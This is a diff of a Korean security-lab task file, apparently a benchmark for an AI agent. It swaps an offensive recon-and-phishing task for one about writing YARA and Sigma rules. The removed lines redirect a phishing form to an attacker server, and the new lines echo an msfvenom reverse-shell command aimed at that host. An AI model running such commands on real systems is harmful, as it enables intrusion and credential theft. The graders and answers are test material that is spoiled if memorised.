@@ -597,57 +597,198 @@ steps:
   bastion_prompt: APT 시뮬레이션을 정리하라. crontab의 비콘 항목을 제거하고, 임시 파일을 삭제한 후, 킬체인 단계별 사용
     기법을 /tmp/killchain_report.txt에 요약해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "백신회사 시그니처 작성자 — APT28 캠페인 재현 + YARA + Sigma 룰 7종"
 
-    1) nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지해줘
+    ## 상황 — APT28 신규 변종 발견, 시그니처 긴급 작성
 
-    2) 발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행해줘
+    당신은 *AhnSec* (가상 백신회사) 위협 시그니처 작성자 (Senior Reverse Engineer 5년차).
+    오전 협력사 SOC 가 APT28 (Fancy Bear) 의 새 변종 의심 트래픽 신고. 24시간 내 *Kill Chain 7단계
+    각각에 대한 YARA + Sigma 룰* 작성해 *고객사 SIEM/EDR 에 push* 해야 한다.
 
-    3) nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리 스크립트를
-    실행해줘
+    > [팀장] "APT28 의 *Forensic IO* 캠페인 (2025) 재현 시뮬 후 각 KC 단계 룰 1개씩 7개 작성.
+    > YARA 는 binary/file pattern, Sigma 는 log query. 10시 정각 push 마감. 신중히."
 
-    4) curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를 다운로드해줘
+    학습 목표 (lecture w01 KC 7 + APT28/29/Lazarus + Diamond/Unified) + (lab #1·#2·#9·#11·#13) 통합.
 
-    5) 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라. sed를 사용하여
-    인라인 수정해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 산출물 — Kill Chain 7 단계 × (시뮬 명령 + YARA/Sigma 룰)
+
+    ### KC 1 — Reconnaissance (T1595.001 Active Scanning)
+    시뮬: `sudo -n nmap -sS -T2 -p 22,80,443,3000 10.20.30.80 2>&1 | head -8`
+    Sigma 룰:
+    `cat <<'EOF'
+    title: APT28 Recon - Slow SYN scan
+    id: 11000001-apt28-recon
+    logsource: {category: firewall}
+    detection:
+      sel:
+        action: 'drop'
+        protocol: 'TCP'
+        flags: 'S'
+      timeframe: 60s
+      condition: sel | count(src_ip) by dst_port > 20
+    level: medium
+    EOF`
+
+    ### KC 2 — Weaponization (T1588.002)
+    시뮬: `echo "[POC] msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf > /tmp/sim_payload.elf (실 X)"`
+    YARA 룰:
+    `cat <<'EOF'
+    rule APT28_Reverse_Shell_Stub_2026 {
+      meta:
+        description = "APT28-style msfvenom reverse shell stub"
+        author = "AhnSec"
+        date = "2026-04-29"
+      strings:
+        $a = "/dev/tcp/" wide ascii
+        $b = { 31 c0 50 68 ?? ?? ?? ?? } // socket() prologue
+        $c = "0>&1" wide ascii
+      condition:
+        2 of ($a, $b, $c)
+    }
+    EOF`
+
+    ### KC 3 — Delivery (T1566.001 Spearphishing Attachment)
+    시뮬: `echo "[POC] phishing email with attachment.docm — macro 가 powershell -enc 호출"`
+    Sigma:
+    `cat <<'EOF'
+    title: APT28 Delivery - Email attachment with embedded macro
+    id: 11000003-apt28-delivery
+    logsource: {product: exchange, service: message-trace}
+    detection:
+      sel:
+        attachment_ext: ['.docm', '.xlsm', '.pptm', '.iso', '.lnk']
+      condition: sel
+    level: high
+    EOF`
+
+    ### KC 4 — Exploitation (T1203 Exploitation for Client Execution)
+    시뮬: `echo "[POC] CVE-2023-XXXXX 활용 — Office macro → CLR injection"`
+    Sigma:
+    `cat <<'EOF'
+    title: APT28 Exploitation - WINWORD child process
+    id: 11000004-apt28-exploit
+    logsource: {product: windows, service: process_creation}
+    detection:
+      sel:
+        ParentImage|endswith: '\\WINWORD.EXE'
+        Image|endswith: ['\\powershell.exe', '\\cmd.exe', '\\rundll32.exe']
+      condition: sel
+    level: high
+    EOF`
+
+    ### KC 5 — Installation (T1053.003 Cron 또는 T1547.001 Registry)
+    시뮬: `echo "[POC] crontab -e 5분 비콘 (실 등록 X). echo '*/5 * * * * /tmp/.x.sh' (text only)"`
+    Sigma (Linux):
+    `cat <<'EOF'
+    title: APT28 Installation - cron 5min beacon
+    id: 11000005-apt28-install
+    logsource: {product: linux, service: auditd}
+    detection:
+      sel:
+        type: 'PATH'
+        name: '/etc/crontab'
+        op: 'WRITE'
+      filter:
+        a0: '/usr/sbin/anacron'
+      condition: sel and not filter
+    level: high
+    EOF`
+
+    ### KC 6 — Command and Control (T1071.001 Web Protocols)
+    시뮬: `echo "[POC] HTTPS C2 — domain matching evil(.*).(top|info)$"`
+    Sigma:
+    `cat <<'EOF'
+    title: APT28 C2 - DGA domain to suspicious TLD
+    id: 11000006-apt28-c2
+    logsource: {category: dns}
+    detection:
+      sel:
+        query|re: '^[a-z0-9]{16,}\\.(top|info|xyz)$'
+      condition: sel
+    level: critical
+    EOF`
+
+    ### KC 7 — Actions on Objectives (T1041 Exfiltration over C2)
+    시뮬: `echo "[POC] base64 사용자 DB → DNS subdomain 청크 exfil (앞 w11 Diamond Model 참고)"`
+    YARA (exfil 흔적):
+    `cat <<'EOF'
+    rule APT28_Exfil_Archive_2026 {
+      meta:
+        description = "APT28 staged exfil archive"
+        author = "AhnSec"
+      strings:
+        $a = "Salted__"             // openssl enc
+        $b = "PK\x03\x04"           // ZIP
+        $c = /[A-Za-z0-9+\/]{50,}=/ // base64 chunks
+      condition:
+        all of ($a, $b, $c)
+    }
+    EOF`
+
+    ## 작성 룰 7종 요약표
+    | KC | ATT&CK | 룰 ID | 형식 |
+    | 1 Recon | T1595.001 | 11000001 | Sigma |
+    | 2 Weapon | T1588.002 | YARA-rev-shell | YARA |
+    | 3 Delivery | T1566.001 | 11000003 | Sigma |
+    | 4 Exploit | T1203 | 11000004 | Sigma |
+    | 5 Install | T1053.003 | 11000005 | Sigma |
+    | 6 C2 | T1071.001 | 11000006 | Sigma |
+    | 7 Actions | T1041 | YARA-exfil | YARA |
+
+    종료: echo "=== APT28 Kill Chain Signature Set ===" + 7 룰 + 요약표.
+  bastion_prompt: |
+    [백신회사 시그니처 — w01 APT28 KC 7 룰]
+
+    Kill Chain 7 단계 × (시뮬 명령 + YARA/Sigma 룰).
+
+    KC 1 Recon: `sudo -n nmap -sS -T2 -p 22,80,443,3000 10.20.30.80 2>&1 | head -8` + Sigma (slow SYN, 5 Sigma rules).
+    KC 2 Weapon: msfvenom POC (실 X) + YARA `APT28_Reverse_Shell_Stub_2026`.
+    KC 3 Delivery: phishing 첨부 + Sigma docm/xlsm/lnk.
+    KC 4 Exploit: WINWORD child + Sigma ParentImage/Image.
+    KC 5 Install: crontab 5min + Sigma auditd PATH.
+    KC 6 C2: DGA TLD + Sigma DNS regex.
+    KC 7 Actions: base64+ZIP+openssl + YARA `APT28_Exfil_Archive_2026`.
+
+    각 룰 heredoc 으로 출력. 마지막에 7행 요약표.
+
+    종료: echo "=== APT28 Kill Chain Signature Set ===" + 7 룰 + 요약표.
+
+    반드시 KC 7 모두 + YARA 2 + Sigma 5 = 7 룰. 실 binary 생성/실 등록 X.
+  hint: |
+    KC 7 단계 각각 시뮬 명령 + 룰 1개. YARA 2 (Weapon, Actions) + Sigma 5 (Recon/Delivery/Exploit/Install/C2).
+    헤드로 + 룰 ID + level 명시.
+    포인트: 백신회사 시그니처 작성자. 실 binary X / 룰 작성 양식 산출물.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: Signature
     field: stdout
     semantic:
-      intent: '[통합] APT 킬체인 5작업 — recon/weaponize/deliver/exploit/report 통합. Lockheed
-        Kill Chain.'
+      intent: |
+        백신회사 시그니처 작성자 페르소나 — APT28 KC 7 단계 × (시뮬 + YARA 2 + Sigma 5) 룰 7종.
+        lecture w01 + lab #1·#2·#9·#11·#13 동시 행동 증명. *YARA + Sigma 룰 산출물*.
       success_criteria:
-      - 5 APT 작업
-      - Kill Chain 7단계
-      - report
+      - KC 7 단계 모두 (Recon/Weapon/Delivery/Exploit/Install/C2/Actions)
+      - 각 단계 ATT&CK ID 명시 (T1595.001 / T1588.002 / T1566.001 / T1203 / T1053.003 / T1071.001 / T1041)
+      - YARA 2 + Sigma 5 룰 (heredoc 양식 준수)
+      - 7행 룰 요약표
       acceptable_methods:
-      - bastion plan
-      - Kill Chain
-      - ATT&CK
+      - heredoc YARA / Sigma yaml
+      - sudo nmap / 시뮬 명령
+      - markdown table
+      - 실 binary 생성 X
       negative_signs:
-      - 단계 생략
-      - 매핑 누락
-      - report 없음
+      - KC 5 단계 이하
+      - YARA 또는 Sigma 양식 누락
+      - 룰 ID 없음
+      - 실 binary/crontab 변경
+      - 매트릭스/슬라이드 형식만
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지해줘
-
-    2) 발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행해줘
-
-    3) nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리 스크립트를
-    실행해줘
-
-    4) curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를 다운로드해줘
-
-    5) 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라. sed를 사용하여
-    인라인 수정해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. KC 7 × 시뮬+룰 + 요약표.
+  answer_detail: |
+    백신회사 시그니처 작성자 — YARA + Sigma 룰 7종. 실 binary X. APT28 캠페인 재현 시뮬 후 룰.
   script: ''
